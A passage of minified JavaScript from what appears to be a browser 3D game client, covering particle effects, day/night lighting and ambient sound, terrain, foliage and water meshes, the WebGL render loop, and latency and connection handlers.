                e.data.accumulator = 0,
                e.data.frame = 0,
                e.data.remove = !1,
                e.data.info = t,
                e.data.tick = t.tick,
                e.data.invisibilified = !1,
                s && e.setParent(s),
                void 0 !== e.data.info.Uk ? rd(e) : e.data.Uk && od(e),
                void 0 !== e.data.info.sound ? nd(e) : e.data.sound && ad(e),
                void 0 !== e.data.info.ribbon ? hd(e) : dd(e),
                void 0 !== e.data.info.mesh ? ud(e) : md(e),
                void 0 !== e.data.info.particles) {
                e.data.particles = [];
                for (let t = 0; t < e.data.info.particles.amount; ++t) {
                    const t = e.data.particle(e.data.info.particles.info, 0, 0, 0, 0, 0, 0, !0);
                    t && e.data.particles.push(t)
                }
            }
            return e
        }
        , ed = t => {
            void 0 !== t.data.Uk && od(t),
                void 0 !== t.data.sound && ad(t),
                void 0 !== t.data.particles && ld(t),
                void 0 !== t.data.ribbon && dd(t),
                void 0 !== t.data.mesh && md(t),
                null !== t.parent && t.setParent(null)
        }
        , sd = ({ world: t }) => {
            for (let t = 0; t < Gh.length; ++t)
                Gh[t].data.remove = !0
        }
        , id = function (t, e = 0, s = 0, i = 0, n = 0, a = 0, r = 0, o = !1) {
            if (o || ji.particles)
                return Nh(t, this.transform.KP, e, s, i, n, a, r, o)
        }
        , nd = t => {
            void 0 !== t.data.sound && t.data.sound.stop(),
                t.data.sound = dl({
                    id: t.data.info.sound.id,
                    loop: t.data.info.sound.loop,
                    dynamic: t.data.info.sound.dynamic,
                    transform: t.data.info.sound.parent ? t.parent : t,
                    distance: t.data.info.sound.distance
                })
        }
        , ad = t => {
            t.data.sound.stop(),
                t.data.sound = void 0
        }
        , rd = t => {
            void 0 !== t.data.Uk && od(t),
                t.data.Uk = dh(t.data.info.Uk, t.data.Uk, t.KP),
                t.data.Uk.setParent(t)
        }
        , od = t => {
            t.data.Uk.setParent(null),
                t.data.Uk.remove = !0,
                t.data.Uk = void 0
        }
        , ld = t => {
            t.data.particles.forEach(t => {
                t.start = 1,
                    t.end = 1
            }
            ),
                t.data.particles = void 0
        }
        , cd = function (t, e, s = this.time) {
            return s >= t && s - e <= t
        }
        , hd = t => {
            void 0 !== t.data.ribbon && (t.data.ribbon.remove = !0),
                t.data.ribbon = wh({
                    parent: t,
                    ...t.data.info.ribbon
                })
        }
        , dd = t => {
            void 0 !== t.data.ribbon && (t.data.ribbon.timeoutSteps = Math.max(1, t.data.ribbon.currentStep),
                t.data.ribbon.parent = null,
                t.data.ribbon = void 0)
        }
        , ud = t => {
            void 0 !== t.data.mesh && md(t),
                t.data.mesh = Kh({
                    geo: t.data.info.mesh.id || "engine/cube.ho",
                    program: jc.multimeshFlat,
                    ts: !0,
                    rs: !0,
                    dynamic: !0
                }),
                t.data.mesh.data.color = t.data.info.mesh.color,
                void 0 !== t.data.info.mesh.scale && Yi(t.data.mesh.scale, t.data.info.mesh.scale),
                void 0 !== t.data.info.mesh.Za && Yi(t.data.mesh.position, t.data.info.mesh.Za),
                void 0 !== t.data.info.mesh.rot && (Yi(t.data.mesh.rotation, t.data.info.mesh.rot),
                    t.data.mesh.rotationNeedsUpdate = !0),
                t.data.mesh.setParent(t)
        }
        , md = t => {
            void 0 !== t.data.mesh && (t.data.mesh.data.multi.remove(t.data.mesh),
                t.data.mesh.setParent(null),
                t.data.mesh = void 0)
        }
        , pd = t => t.Za[0] = -1;
    function fd(t, e = 0, s = 0, i = 0, n = 0, a = 0, r = 0) {
        const o = this.transform.position
            , l = this.transform.parent.scale
            , c = this.transform.parent.position;
        t[0] = (o[0] + e) * l[0] + c[0] + n,
            t[1] = (o[1] + s) * l[1] + c[1] + a,
            t[2] = (o[2] + i) * l[2] + c[2] + r
    }
    var gd = Object.freeze({
        __proto__: null,
        effects: Gh,
        tick: Jh,
        createEffect: td,
        onWorldDestroy: sd,
        zeroParticle: pd
    });
    const vd = [];
    let yd, bd;
    const wd = {
        color: [0, 0, 0]
    }
        , xd = {
            color: [0, 0, 0]
        }
        , kd = {
            color: [0, 0, 0],
            dir: [0, 0, 0]
        }
        , $d = {
            near: 10,
            FS: 100,
            color: [0, 0, 0]
        }
        , Sd = () => {
            Ac.Qx.value = $d.near,
                Ac.NR.value = $d.FS,
                Ac.Ck.value = $d.color,
                Ac.rJ.value = xd.color,
                Ac.Kp.value = wd.color,
                Ac.Cq.value = kd.color,
                Ac.Cz.value = kd.dir,
                Vi(kd.dir, 1.5, 2.5, 0),
                on(kd.dir, kd.dir),
                Ic(kd.dir)
        }
        ;
    let Ed;
    const Md = ({ dt: t, world: e, viewRange: s, camera: i }) => {
        e.data && _d(e),
            e.data && Cd();
        let n = 5
            , a = s + 10;
        Ed != a && (Ac.Qx.value = n,
            Ac.NR.value = a,
            Ed = a)
    }
        , _d = t => {
            let e = t.daytime;
            e = e < .85 ? .5 * rr(0, .85, e) : .5 + .5 * rr(.85, 1, e),
                Ac.QP.value = e;
            let s, i, n = .5;
            e < .05 ? (s = 1,
                i = 0,
                n = rr(0, .05, e)) : e < .4 ? (s = 0,
                    i = 0) : e < .5 ? (s = 0,
                        i = 1,
                        n = rr(.4, .5, e)) : e < .6 ? (s = 1,
                            i = 2,
                            n = rr(.5, .6, e)) : e < .9 ? (s = 2,
                                i = 2) : (s = 2,
                                    i = 1,
                                    n = rr(.9, 1, e)),
                gr(kd.color, vd[s].directional, vd[i].directional, n),
                gr($d.color, vd[s].fog, vd[i].fog, n),
                gr(wd.color, vd[s].ambient, vd[i].ambient, n),
                gr(xd.color, vd[s].sky, vd[i].sky, n),
                Aa.clearColor($d.color[0], $d.color[1], $d.color[2], 1)
        }
        ;
    te.subscribe(t => {
        t && Ua.deserialized && Pd(Ua)
    }
    );
    const Cd = t => {
        if (!yd || !bd)
            return;
        const e = Ac.QP.value;
        let s, i, n = .5;
        e < .1 ? (s = yd,
            i = bd,
            n = .5 * rr(0, .1, e) + .5) : e < .4 ? (s = yd,
                i = bd,
                n = -1) : e < .6 ? (s = bd,
                    i = yd,
                    n = rr(.4, .6, e)) : e < .9 ? (s = bd,
                        i = yd,
                        n = -1) : (s = yd,
                            i = bd,
                            n = .5 * rr(.9, 1, e)),
            n >= 0 ? (s.gain.gain.value = 1 - n,
                i.gain.gain.value = n) : (s.gain.gain.value = 0,
                    i.gain.gain.value = 1)
    }
        , Td = ({ world: t, first: e }) => {
            t.data.cols.forEach((t, e) => {
                vd[e] = {
                    fog: or(t.fog),
                    directional: or(t.directional),
                    ambient: or(t.ambient),
                    sky: or(t.sky)
                }
            }
            ),
                Pd(t)
        }
        , Pd = t => {
            bd && bd.stop(),
                yd && yd.stop(),
                bd = dl({
                    id: t.getSetting("ambDay") || "ambient/gs_day",
                    pitch: -1,
                    loop: !0,
                    gain: !0,
                    type: "ambience"
                }),
                yd = dl({
                    id: t.getSetting("ambNight") || "ambient/gs_night",
                    pitch: -1,
                    loop: !0,
                    gain: !0,
                    type: "ambience"
                })
        }
        ;
    var Id = Object.freeze({
        __proto__: null,
        ambient: wd,
        sky: xd,
        directional: kd,
        fog: $d,
        init: Sd,
        tick: Md,
        onWorldParse: Td,
        createWorldSounds: Pd
    });
    let Dd = 1;
    const Ad = t => {
        Dd = t % 2147483647,
            Dd <= 0 && (Dd += 2147483646)
    }
        , Bd = () => Dd = 16807 * Dd % 2147483647
        , Rd = () => (Bd() - 1) / 2147483647
        , zd = (t, e) => t * e / 255
        , Fd = (t, e) => Math.round(t / e * 65535)
        , Zd = (t, e) => t * e / 65535
        , Ud = t => t[0] << 4 | 15 & t[1]
        , Ld = t => [t >>> 4, 15 & t]
        , Nd = (t, e) => {
            const s = e / 65535;
            return (t[0] / s << 16 | t[1] / s & 65535) >>> 0
        }
        , Od = (t, e) => {
            const s = e / 65535;
            return [(t >>> 16) * s, (65535 & t) * s]
        }
        , jd = t => t / 60
        , qd = t => {
            const e = Math.floor(t % 8);
            t /= 8;
            const s = Math.floor(t % 8);
            t /= 8;
            const i = Math.floor(t % 10);
            t /= 10;
            const n = Math.floor(t % 10);
            return t /= 10,
            {
                col3: e,
                col2: s,
                col1: i,
                val1: Math.floor(t),
                val2: n
            }
        }
        , Xd = t => {
            const e = Math.floor(t % 16);
            return t /= 16,
            {
                type: Math.floor(t % 16),
                value: e
            }
        }
        , Hd = 8
        , Kd = 4
        , Wd = 256 / (2 * Math.PI)
        , Yd = 16
        , Vd = (t, e, s) => (e.id = s.id,
            Vi(e.Za, s.x / Kd, 0, s.z / Kd),
            e.Za[1] = Math.round(t.getHeight(e.Za[0], e.Za[2])) - 10 + s.y / Hd,
            Vi(e.rot, s.rx / Wd, s.ry / Wd, s.rz / Wd),
            e.scale = s.scale / Yd,
            e)
        , Gd = (t, e) => (t.id = e.id,
            t.meta = e.meta,
            t.class = e.class,
            t.faction = e.faction,
            t.name = e.name,
            t.Za = Od(e.Za, 768),
            t.rot = zd(e.rot, 2 * Math.PI),
            t)
        , Qd = () => { }
        , Jd = ({ chunk: t, gl: e, info: s }) => {
            if (ji.grass && s.foliage) {
                const s = [];
                for (let e = 0; e < 64; ++e)
                    for (let i = 0; i < 64; ++i) {
                        const n = i + 64 * e
                            , a = Xd(t.data.foliage.readUInt8(n));
                        Ad(n ** 2);
                        for (let n = 0; n < Math.min(Math.round(a.value / 8), 2); ++n) {
                            const n = [i - .7 + 1.4 * Rd(), 0, e - .7 + 1.4 * Rd(), .4 + (1.5 * Rd() + .2) * a.value / 15];
                            if (n[0] < 0 || n[0] >= 64 || n[2] < 0 || n[2] >= 64)
                                continue;
                            n[1] = t.getHeight(n[0], n[2]) + .5 * n[3];
                            const r = {
                                Za: n,
                                info: [a.type]
                            };
                            n[0] += t.origin[0],
                                n[2] += t.origin[2],
                                s.push(r)
                        }
                    }
                const i = s.length;
                if (!(i > 0))
                    return;
                tu(t, e);
                const n = t.geometry.foliage;
                let a, r;
                n.attributes.position.data.byteLength == 4 * i * 4 ? (a = n.attributes.position.data,
                    r = n.attributes.info.data) : (a = new Float32Array(4 * i),
                        n.attributes.position.data = a,
                        r = new Float32Array(1 * i),
                        n.attributes.info.data = r),
                    s.forEach((t, e) => {
                        a.set(t.Za, 4 * e),
                            r.set(t.info, 1 * e)
                    }
                    ),
                    n.setDrawRange(0, i),
                    n.updateAttribute(n.attributes.position),
                    n.updateAttribute(n.attributes.info),
                    n.bounds = t.geometry.terrain.bounds
            }
        }
        , tu = (t, e) => {
            t.geometry.foliage || (t.geometry.foliage = new bn(e, {
                info: {
                    size: 1,
                    data: new Float32Array(1)
                },
                position: {
                    size: 4,
                    data: new Float32Array(4)
                }
            })),
                t.meshes.foliage || (t.meshes.foliage = new na(e, {
                    mode: e.POINTS,
                    matrixAutoUpdate: !1,
                    receiveShadow: Sc.sK,
                    geometry: t.geometry.foliage,
                    program: jc.foliage
                }),
                    t.meshes.foliage.renderOrder = 1e3,
                    t.meshes.terrain.addChild(t.meshes.foliage),
                    t.meshes.foliage.updateMatrix())
        }
        , eu = ({ chunk: t, gl: e, scene: s }) => {
            t.geometry.foliage && t.geometry.foliage.remove()
        }
        , su = ({ world: t, first: e }) => {
            const s = t.data.settings.find(t => "foliagetex" === t.id);
            s && Oo("foliage/" + s.value + ".png", t => {
                jc.foliage.active = !0,
                    jc.foliage.uniforms.jx.value = t
            }
            )
        }
        ;
    var iu = Object.freeze({
        __proto__: null,
        init: Qd,
        rebuild: Jd,
        destroy: eu,
        onWorldParse: su
    });
    const nu = []
        , au = (t, e, s, i) => {
            const n = Ua.entity(t)
                , a = Ua.entity(e);
            if (s.fx.effectMissile && void 0 !== n && void 0 !== a && void 0 !== n.transform && void 0 !== a.transform && (!n.transform.inFog || !a.transform.inFog)) {
                const t = {
                    targetid: e,
                    timer: i,
                    effect: td(s.fx.effectMissile),
                    start: Qi([0, 0, 0], mn(Oa, [0, 0, n.shape.radius], n.rot), n.Za)
                };
                nu.push(t),
                    ou(t, nu.length - 1)
            }
        }
        , ru = (t, e, s, i) => {
            if (s.fx.effectMissile) {
                const n = {
                    timer: i,
                    start: t,
                    path: e,
                    effect: td(s.fx.effectMissile)
                };
                nu.push(n),
                    ou(n, nu.length - 1)
            }
        }
        , ou = (t, e) => {
            const s = Ua.entity(t.targetid);
            if (t.targetid > 0 && !s || t.timer.done(Ua.smoothtime))
                return nu.splice(e, 1),
                    void (t.effect.data.remove = !0);
            let i = t.path;
            i || (i = tn([0, 0, 0], s.visualPosition, t.start)),
                sn(t.effect.position, t.start, i, t.timer.fraction(Ua.smoothtime));
            const n = Ua.getHeight(t.effect.position[0], t.effect.position[2]) + (s ? .3 : .7);
            n > t.effect.position[1] && (t.effect.position[1] = n),
                s && t.effect.lookAt(s.visualPosition, !1, La),
                s && t.timer.passed(Ua.smoothtime) > .1 && (Yi(t.start, t.effect.position),
                    t.timer.start = Ua.smoothtime),
                t.effect.updateMatrixWorld(!1)
        }
        , lu = () => {
            nu.forEach(ou)
        }
        , cu = ({ world: t }) => {
            nu.forEach(t => {
                t.effect.data.remove = !0
            }
            ),
                nu.length = 0
        }
        ;
    var hu = Object.freeze({
        __proto__: null,
        addMissileTargeted: au,
        addMissileFree: ru,
        tick: lu,
        onWorldDestroy: cu
    });
    let du = void 0
        , uu = [];
    const mu = new fh(0, 1)
        , pu = ({ world: t }) => {
            uu && (du ? du.ended && (fu(t),
                du = void 0) : mu.done(t.smoothtime) && (0 === mu.start ? fu(t) : du = dl({
                    id: "music/" + Go(uu),
                    pitch: -1,
                    type: "music"
                })))
        }
        , fu = t => mu.reset(t.smoothtime, Vo(1, 2))
        , gu = ({ world: t, first: e }) => {
            e && du && (du.stop(),
                du = void 0);
            const s = t.getSetting("music");
            void 0 !== s && (uu = s.split(","))
        }
        ;
    var vu = Object.freeze({
        __proto__: null,
        tick: pu,
        onWorldParse: gu
    });
    let yu;
    const bu = () => {
        yu = new na(Aa, {
            program: jc.sun
        }),
            Gi(yu.scale, .25),
            yu.setParent(Gc),
            yu.visible = !1,
            Do("engine/plane.ho", t => {
                const e = new bn(Aa, t);
                yu.geometry = e,
                    yu.visible = !0
            }
            )
    }
        , wu = ({ dt: t, world: e, camera: s, cameraPivot: i }) => {
            Yi(yu.position, kd.dir),
                en(yu.position, yu.position, .45),
                yu.lookAt(Na, !1, La)
        }
        ;
    var xu = Object.freeze({
        __proto__: null,
        get mesh() {
            return yu
        },
        init: bu,
        tick: wu
    });
    const ku = {
        beigerocks: [.8, .31, .6, .48],
        beigesand: [.8, .54, .73, .43],
        bluegrass: [1.3, .29, .68, .6],
        browndirt: [.8, .2, .54, .65],
        cobblestone: [1.5, .23, .75, .45],
        darkrocks: [.8, .17, .49, .51],
        driedmud: [.8, .48, .76, .22],
        greengrass: [1.3, .22, .52, .71],
        greyrock: [.8, .24, .47, .57],
        mossysandstone: [.8, .21, .76, .45],
        muddyrocks: [.8, .21, .48, .73],
        orangesand: [.8, .65, .86, .35],
        purplefungus: [.8, .21, .44, .53],
        purplerock: [.8, .15, .4, .36],
        sedimentary: [.8, .33, .59, .42],
        mossygrass: [1, .22, .52, .6],
        greysand: [.35, .18, .53, .56]
    }
        , $u = [0, 0, 0]
        , Su = [0, 0, 0]
        , Eu = [0, 0, 0]
        , Mu = [0, 0, 0]
        , _u = [0, 0, 0]
        , Cu = [0, 0, 0]
        , Tu = ({ chunk: t, gl: e, scene: s, info: i }) => {
            Du(t, e, s);
            const n = t.geometry.terrain;
            if (i.heightmap) {
                const e = n.attributes.position.data
                    , s = n.attributes.Lx.data
                    , i = n.attributes.index.data;
                for (let s = 0; s < 65; ++s)
                    for (let i = 0; i < 65; ++i) {
                        e[3 * (i + 65 * s) + 1] = t.getHeight(i, s)
                    }
                for (let t = 0, e = s.length; t < e; ++t)
                    s[t] = 0;
                for (let t = 0, n = i.length; t < n; t += 3) {
                    const n = 3 * i[t]
                        , a = 3 * i[t + 2]
                        , r = 3 * i[t + 1];
                    Vi($u, e[n], e[n + 1], e[n + 2]),
                        Vi(Su, e[a], e[a + 1], e[a + 2]),
                        Vi(Eu, e[r], e[r + 1], e[r + 2]),
                        tn(Mu, $u, Su),
                        tn(_u, Eu, Su),
                        cn(Cu, Mu, _u),
                        s[n] += Cu[0],
                        s[n + 1] += Cu[1],
                        s[n + 2] += Cu[2],
                        s[a] += Cu[0],
                        s[a + 1] += Cu[1],
                        s[a + 2] += Cu[2],
                        s[r] += Cu[0],
                        s[r + 1] += Cu[1],
                        s[r + 2] += Cu[2]
                }
                for (let t = 0, e = s.length; t < e; t += 3)
                    Vi(Cu, s[t], s[t + 1], s[t + 2]),
                        on(Cu, Cu),
                        s.set(Cu, t);
                n.updateAttribute(n.attributes.position),
                    n.updateAttribute(n.attributes.Lx)
            }
            if (i.texture) {
                const e = n.attributes.JZ.data
                    , s = n.attributes.TQ.data;
                for (let i = 0; i < 65; ++i)
                    for (let n = 0; n < 65; ++n) {
                        const a = n + 65 * i;
                        let r;
                        if (64 == i || 64 == n) {
                            const e = t.getNeighborChunk(n, i);
                            if (e && e.deserialized)
                                r = qd(e.data.color.readUInt16BE(2 * (n % 64 + i % 64 * 64)));
                            else {
                                const e = Math.min(n, 63)
                                    , s = Math.min(i, 63);
                                r = qd(t.data.color.readUInt16BE(2 * (e + 64 * s)))
                            }
                        } else
                            r = qd(t.data.color.readUInt16BE(2 * (n + 64 * i)));
                        for (let t = 0; t < 4; ++t)
                            Pu(e, 4 * a + t, t, r),
                                Pu(s, 4 * a + t, t + 4, r)
                    }
                n.updateAttribute(n.attributes.JZ),
                    n.updateAttribute(n.attributes.TQ)
            }
        }
        , Pu = (t, e, s, i) => {
            s == i.col1 ? t[e] = .5 + i.val1 / 8 * .5 : s == i.col2 ? t[e] = .5 - i.val1 / 8 * .5 : s == i.col3 ? t[e] = (.5 - i.val1 / 8 * .5) * (i.val2 / 8) * .5 : t[e] = 0
        }
        , Iu = {
            min: [0, 0, 0],
            max: [64, 64, 64],
            center: [32, 32, 32],
            scale: [64, 64, 64],
            radius: 60,
            initiated: !0
        }
        , Du = (t, e, s) => {
            if (t.geometry.terrain || (t.geometry.terrain = new bn(e, Au(e, 64)),
                Object.assign(t.geometry.terrain.bounds, Iu)),
                !t.meshes.terrain) {
                const i = t.meshes.terrain = new na(e, {
                    matrixAutoUpdate: !1,
                    shadowProgram: jc.shadowTerrain,
                    throwShadow: new Set([...Sc.shadowStatic, ...Sc.water]),
                    receiveShadow: Sc.sK,
                    geometry: t.geometry.terrain,
                    program: jc.terrain
                });
                i.frustumCulled = !0,
                    Yi(i.position, t.origin),
                    s.addChild(i),
                    i.renderOrder = 2e3,
                    i.updateMatrix(),
                    i.updateMatrixWorld(!1)
            }
        }
        , Au = (t, e) => {
            const s = (e + 1) ** 2
                , i = e ** 2
                , n = new Float32Array(3 * s)
                , a = new Float32Array(3 * s)
                , r = new Float32Array(2 * s)
                , o = new Uint32Array(6 * i);
            let l = 0;
            for (let t = 0, s = 0; t <= e; ++t)
                for (let i = 0; i <= e; ++i,
                    ++s) {
                    if (n[3 * s + 0] = i,
                        n[3 * s + 2] = t,
                        r[2 * s] = i / e,
                        r[2 * s + 1] = t / e,
                        i === e || t === e)
                        continue;
                    const a = i + t * (e + 1)
                        , c = i + (t + 1) * (e + 1)
                        , h = i + (t + 1) * (e + 1) + 1
                        , d = i + t * (e + 1) + 1;
                    o[6 * l] = a,
                        o[6 * l + 1] = c,
                        o[6 * l + 2] = d,
                        o[6 * l + 3] = c,
                        o[6 * l + 4] = h,
                        o[6 * l + 5] = d,
                        ++l
                }
            return {
                position: {
                    size: 3,
                    data: n
                },
                Lx: {
                    size: 3,
                    data: a
                },
                Ek: {
                    size: 2,
                    data: r
                },
                index: {
                    type: t.UNSIGNED_INT,
                    data: o
                },
                JZ: {
                    size: 4,
                    data: new Float32Array(4 * s)
                },
                TQ: {
                    size: 4,
                    data: new Float32Array(4 * s)
                }
            }
        }
        , Bu = ({ chunk: t, gl: e, scene: s }) => {
            t.geometry.terrain && t.geometry.terrain.remove(),
                t.meshes.terrain && s.removeChild(t.meshes.terrain)
        }
        , Ru = ({ world: t, first: e }) => {
            const s = t.data.settings.find(t => "terraintex" === t.id);
            s && s.value.split(",").forEach((t, e) => {
                Oo("terrain/" + t + ".jpg", s => {
                    Fo.terrain[e] = s;
                    const i = Ac["tinf" + e];
                    qn(i.value, ku[t]),
                        i.state++
                }
                )
            }
            )
        }
        ;
    var zu = Object.freeze({
        __proto__: null,
        rebuild: Tu,
        createTerrainGeometry: Au,
        destroy: Bu,
        onWorldParse: Ru
    });
    const Fu = []
        , Zu = []
        , Uu = () => {
            Fu[0] = new bn(Aa, Ou(Aa, 64)),
                Fu[1] = new bn(Aa, Ou(Aa, 8)),
                Fu[2] = new bn(Aa, Ou(Aa, 1)),
                Oo("water.jpg", t => {
                    jc.water.uniforms.Ux.value = t,
                        Oo("water2.jpg", t => {
                            jc.water.active = !0,
                                jc.water.uniforms.WY.value = t
                        }
                        )
                }
                )
        }
        , Lu = ({ world: t, first: e }) => {
            for (let e = 0; e < t.data.water.length; ++e) {
                let s = Zu[e];
                const i = t.data.water[e];
                s || (Zu[e] = s = new na(Aa, {
                    matrixAutoUpdate: !1,
                    program: jc.water,
                    receiveShadow: Sc.water
                }),
                    Za.addChild(s)),
                    s.data = i,
                    s.geometry = Fu[i.Oy],
                    s.Oy = i.Oy,
                    s.speed = i.speed,
                    s.pP = i.pP,
                    s.YX = i.YX,
                    s.visibility = i.visibility,
                    s.Tp = or(i.Tp),
                    s.Nt = or(i.Nt),
                    s.Mx = or(i.Mx),
                    s.renderOrder = 5e3;
                const n = 64 * t.chunkAmount;
                0 == i.Oy ? (Vi(s.position, .5 * n, i.Za[1] / 10, .5 * n),
                    Vi(s.scale, 2 * n, 1, 2 * n),
                    Vi(s.rotation, 0, 0, 0)) : (Vi(s.position, i.Za[0], i.Za[1] / 10, i.Za[2]),
                        Vi(s.scale, i.sx, 1, i.sz),
                        Vi(s.rotation, 0, i.rot / Ga, 0)),
                    s.rotationNeedsUpdate = !0,
                    s.position[0] = nr(0, n, s.position[0]),
                    s.position[2] = nr(0, n, s.position[2]),
                    s.updateMatrix()
            }
        }
        , Nu = ({ world: t }) => {
            Zu.forEach(t => {
                t.setParent(null)
            }
            ),
                Zu.length = 0
        }
        , Ou = (t, e) => {
            const s = e ** 2
                , i = new Float32Array(3 * (e + 1) ** 2)
                , n = new Uint32Array(6 * s)
                , a = 1 / e;
            let r = 0;
            for (let t = 0, s = 0; t <= e; ++t)
                for (let o = 0; o <= e; ++o,
                    ++s) {
                    if (i[3 * s + 0] = a * o - .5,
                        i[3 * s + 2] = a * t - .5,
                        o === e || t === e)
                        continue;
                    const l = o + t * (e + 1)
                        , c = o + (t + 1) * (e + 1)
                        , h = o + (t + 1) * (e + 1) + 1
                        , d = o + t * (e + 1) + 1;
                    n[6 * r] = l,
                        n[6 * r + 1] = c,
                        n[6 * r + 2] = d,
                        n[6 * r + 3] = c,
                        n[6 * r + 4] = h,
                        n[6 * r + 5] = d,
                        ++r
                }
            return {
                position: {
                    size: 3,
                    data: i
                },
                index: {
                    type: t.UNSIGNED_INT,
                    data: n
                }
            }
        }
        ;
    var ju = Object.freeze({
        __proto__: null,
        meshes: Zu,
        init: Uu,
        onWorldParse: Lu,
        onWorldDestroy: Nu,
        createWaterGeometry: Ou
    });
    let qu = ji.resolution / 100;
    const Xu = new On({
        width: window.innerWidth,
        height: window.innerHeight,
        resolution: qu,
        antialias: !1,
        powerPreference: "high-performance"
    });
    Xu.isWebgl2 || (alert("WebGL2 problem found."),
        window.location.href = "/technical");
    const Hu = Xu.gl
        , Ku = new sa(Hu, {
            fov: 80,
            near: .1,
            FS: 500
        })
        , Wu = new Jn
        , Yu = new Jn
        , Vu = new Pa(Hu, {
            width: window.innerWidth,
            height: window.innerHeight,
            resolution: qu
        });
    let Gu = 100
        , Qu = Gu ** 2;
    const Ju = [Wo, Dc, Vc, Id, nh, zu, ju, iu, hu, gd, Xh, ph, Eh, th, xu, bl, vu]
        , tm = {
            tick: [],
            onWorldParse: [],
            onWorldDestroy: [],
            rebuild: [],
            destroy: []
        }
        , em = () => {
            Yu.matrixAutoUpdate = !1,
                Yu.addChild(Wu),
                Wu.addChild(Ku),
                Wu.setParent(null),
                Vi(Ku.position, 0, 1, -1),
                Ku.lookAt(La, La),
                Ja(Hu, Ku, Wu, Vu, Xu, Yu),
                Ju.forEach(t => {
                    void 0 !== t.init && t.init()
                }
                ),
                Ju.splice(2, 1),
                Ju.push(Vc),
                Ju.forEach(t => {
                    t.tick && tm.tick.push(t.tick),
                        t.onWorldParse && tm.onWorldParse.push(t.onWorldParse),
                        t.onWorldDestroy && tm.onWorldDestroy.push(t.onWorldDestroy),
                        t.rebuild && tm.rebuild.push(t.rebuild),
                        t.destroy && tm.destroy.push(t.destroy)
                }
                ),
                Xu.canvas2dElement.className = "l-canvas",
                Xu.gl.canvas.className = "l-canvas",
                Hu.canvas.style.pointerEvents = "all",
                window.addEventListener("resize", sm, !1),
                Xu.resize = sm,
                sm(null, !0)
        }
        ;
    Oe.subscribe(t => {
        Gu = t ** 2 / 10,
            Qu = Gu ** 2,
            Ku.FS = Gu + 10,
            Ku.perspective()
    }
    ),
        ee.subscribe(t => { }
        );
    const sm = (t, e) => {
        e || (Xu.setSize(window.innerWidth, window.innerHeight, qu),
            Vu.resize({
                width: window.innerWidth,
                height: window.innerHeight,
                dpr: 1,
                resolution: qu
            })),
            Ku.aspect = Hu.canvas.width / Hu.canvas.height,
            Ku.perspective(),
            Oc(Hu.canvas.width, Hu.canvas.height)
    }
        ;
    je.subscribe(t => {
        const e = t / 100
            , s = qu !== e;
        qu = e,
            ji.resolutionScale = e,
            s && sm(null, !1)
    }
    );
    const im = () => {
        Yu.needsFullUpdate = !0,
            ji.shadows && kc && (Kc(Hu),
                Xu.render({
                    scene: Yu,
                    camera: _c.water,
                    shadowTarget: $c.water
                }),
                Yc(),
                Hc(Hu),
                Xu.render({
                    scene: Yu,
                    camera: _c.sK,
                    shadowTarget: $c.shadowStatic
                }),
                Wc(),
                Pc(!1)),
            ji.shadows && (Hu.bindFramebuffer(Hu.READ_FRAMEBUFFER, $c.shadowStatic.buffer),
                Hu.bindFramebuffer(Hu.DRAW_FRAMEBUFFER, $c.sK.buffer),
                Hu.blitFramebuffer(0, 0, Mc, Mc, 0, 0, Mc, Mc, Hu.DEPTH_BUFFER_BIT, Hu.NEAREST),
                Xu.render({
                    scene: Yu,
                    clear: !1,
                    camera: _c.sK,
                    sceneCamera: Ku,
                    shadowTarget: $c.sK
                })),
            ji.postProcessing ? Vu.render({
                scene: Yu,
                camera: Ku,
                update: !ji.shadows
            }) : Xu.render({
                scene: Yu,
                camera: Ku,
                update: !ji.shadows
            })
    }
        , nm = (t, e) => {
            const s = {
                dt: t,
                world: e,
                camera: Ku,
                cameraPivot: Wu,
                viewRange: Gu,
                renderer: Xu,
                viewRangeSquared: Qu
            };
            for (let t = 0; t < tm.tick.length; ++t)
                tm.tick[t](s)
        }
        , am = ({ world: t, first: e }) => {
            for (let s = 0; s < tm.onWorldParse.length; ++s)
                tm.onWorldParse[s]({
                    world: t,
                    first: e
                })
        }
        , rm = ({ world: t }) => {
            for (let e = 0; e < tm.onWorldDestroy.length; ++e)
                tm.onWorldDestroy[e]({
                    world: t
                });
            Vh()
        }
        , om = (t, e) => {
            for (let s = 0; s < tm.rebuild.length; ++s)
                tm.rebuild[s]({
                    chunk: t,
                    gl: Hu,
                    scene: Yu,
                    info: e
                });
            (e.heightmap || e.texture) && Pc(!0)
        }
        , lm = t => {
            for (let e = 0; e < tm.destroy.length; ++e)
                tm.destroy[e]({
                    chunk: t,
                    gl: Hu,
                    scene: Yu
                })
        }
        ;
    function cm(t) {
        let e;
        return {
            c() {
                e = T("div"),
                    e.innerHTML = '<div class="bounce1 svelte-twvoek"></div><div class="bounce2 svelte-twvoek"></div><div class="bounce3 svelte-twvoek"></div>',
                    B(e, "class", "spinner svelte-twvoek")
            },
            m(t, s) {
                M(t, e, s)
            },
            p: i,
            i: i,
            o: i,
            d(t) {
                t && _(e)
            }
        }
    }
    class hm extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, null, cm, d, {})
        }
    }
    function dm(t, { delay: e = 0, duration: s = 400, easing: i = n }) {
        const a = +getComputedStyle(t).opacity;
        return {
            delay: e,
            duration: s,
            easing: i,
            css: t => "opacity: " + t * a
        }
    }
    const um = 1 / 30 + .006;
    let mm = .03
        , pm = .03;
    const fm = t => {
        mm = (5 * mm + nr((Ua.tickId - t) * Ua.timestep - um, .001, 1)) / 6
    }
        ;
    let gm = .016;
    const vm = t => {
        gm = (10 * gm + t) / 11
    }
        ;
    let ym = .016
        , bm = 0;
    const wm = t => {
        ym = t
    }
        , xm = new fh(0, .05)
        , km = t => {
            ji.showFpsPing && xm.done(Ua.time) && (pm = (20 * pm + mm) / 21,
                bm = (10 * bm + ym) / 11,
                xm.reset(Ua.time),
                ke.update(t => (t[0] = nr(1e3 * pm >> 0, 1, 999),
                    t[1] = (1e3 / gm).toFixed(1),
                    t[2] = (bm / 1e3).toFixed(1),
                    t)))
        }
        , $m = t => {
            xm.reset(t.time)
        }
        ;
    var Sm = Object.freeze({
        __proto__: null,
        get latency() {
            return mm
        },
        parseLatencyPacket: fm,
        parseFrameDelta: vm,
        parseBandwidth: wm,
        tick: km,
        onWorldEnter: $m
    });
    let Em, Mm = 0, _m = 0;
    const Cm = {
        open: [],
        close: []
    };
    for (const t in ro)
        Cm[ro[t].header] = [];
    const Tm = t => { }
        , Pm = t => {
            console.log("Connected"),
                Mm = 1;
            for (let e = 0, s = Cm.open.length; e < s; ++e)
                Cm.open[e](t)
        }
        , Im = t => {
            console.log("Connection closed:", t.reason, t.code),
                Mm = 0;
